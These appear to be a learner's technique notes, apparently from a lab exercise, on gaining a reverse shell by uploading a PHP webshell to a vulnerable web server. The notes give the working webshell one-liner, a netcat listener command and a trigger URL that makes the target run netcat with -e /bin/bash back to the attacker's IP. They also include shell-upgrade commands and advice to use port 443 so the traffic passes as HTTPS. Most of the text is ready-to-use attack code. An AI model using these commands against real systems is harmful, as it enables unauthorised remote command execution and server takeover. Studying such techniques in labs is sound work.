# Web Reverse Shell — Technique Notes

## Overview
A reverse shell via a PHP webshell uploaded to a vulnerable web server. The target connects back to our machine giving us remote command execution.

---

## How it Works
```
Upload PHP webshell to target
        ↓
Start netcat listener on our machine
        ↓
Trigger the shell via browser
        ↓
Target connects back to us
        ↓
Interactive shell
```

---

## Step 1 — Create the PHP Webshell

```php
<?php echo system($_GET['cmd']); ?>
```

This simple one-liner takes a `cmd` parameter from the URL and executes it on the server.

---

## Step 2 — Start Netcat Listener

```bash
sudo nc -lvnp 443
```

| Flag | Meaning |
|------|---------|
| `-l` | Listen mode |
| `-v` | Verbose output |
| `-n` | No DNS resolution |
| `-p 443` | Listen on port 443 (looks like HTTPS traffic) |

---

## Step 3 — Trigger the Shell

Visit this URL in your browser:

```
http://<target_ip>/uploads/shell.php?cmd=nc 192.168.134.226 443 -e /bin/bash
```

This tells the server to run netcat and connect back to our machine, sending a bash shell.

---

## Step 4 — Upgrade to Interactive Shell

A raw netcat shell is limited. Upgrade it to a fully interactive TTY:

```bash
# Step 1 — Spawn a proper bash shell using Python
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Step 2 — Background the shell
CTRL + Z

# Step 3 — Fix terminal settings
stty raw -echo; fg

# Step 4 — Set terminal type
export TERM=xterm
```

### Why upgrade?
| Raw Shell | Interactive TTY |
|-----------|----------------|
| No tab completion | ✅ Tab completion |
| No arrow keys | ✅ Arrow keys work |
| No clear screen | ✅ Can clear screen |
| Breaks on CTRL+C | ✅ Stable |

---

## What I Learned

- How a simple PHP webshell works
- How to use netcat to catch reverse shells
- Why port 443 is preferred — looks like normal HTTPS traffic
- How to upgrade a dumb shell to a fully interactive TTY